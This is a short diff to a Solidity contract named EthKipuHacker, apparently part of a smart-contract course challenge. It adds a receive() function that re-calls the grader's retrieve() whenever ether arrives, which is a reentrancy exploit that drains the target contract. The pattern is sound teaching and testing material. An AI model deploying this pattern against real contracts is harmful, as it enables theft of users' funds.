@@ -27,4 +27,10 @@ contract EthKipuHacker {
         require(msg.sender == i_owner, "You're not the owner");
         i_grader.gradeMe(name);
     }
+
+    receive() external payable {
+        if (address(this).balance > 3) {
+            i_grader.retrieve{value: 4}();
+        }
+    }
 }
